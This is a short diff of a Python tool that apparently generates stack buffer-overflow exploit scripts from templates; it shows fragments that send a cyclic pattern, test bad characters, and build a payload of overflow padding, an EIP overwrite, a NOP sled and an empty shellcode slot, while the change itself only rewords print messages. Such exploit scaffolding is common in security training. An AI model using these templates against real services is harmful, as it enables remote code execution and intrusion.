@@ -205,8 +205,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 pattern = {}{}
 
+print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
 try:
-    print('Sending %s bytes unique chars...' % (str(len(pattern))))
     s.connect(('{}', {}))
 '''.format(
         pattern_val, pattern_desc, host, port
@@ -272,8 +272,8 @@ badchars = (
 
 buffer = "{}"*len_overflow + eip + badchars
 
+print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
-    print('Sending buffer...')
     s.connect(('{}', {}))
 '''.format(
         length, length - 30, char, host, port
@@ -324,8 +324,8 @@ shellcode    = \"\"
 padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
 buffer  = "{}"*len_overflow + eip + \"\\x90\"*len_nop_sled + shellcode + padding
 
+print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
-    print('Sending buffer...')
     s.connect(('{}', {}))
 '''.format(
         length, length - 30, char, host, port
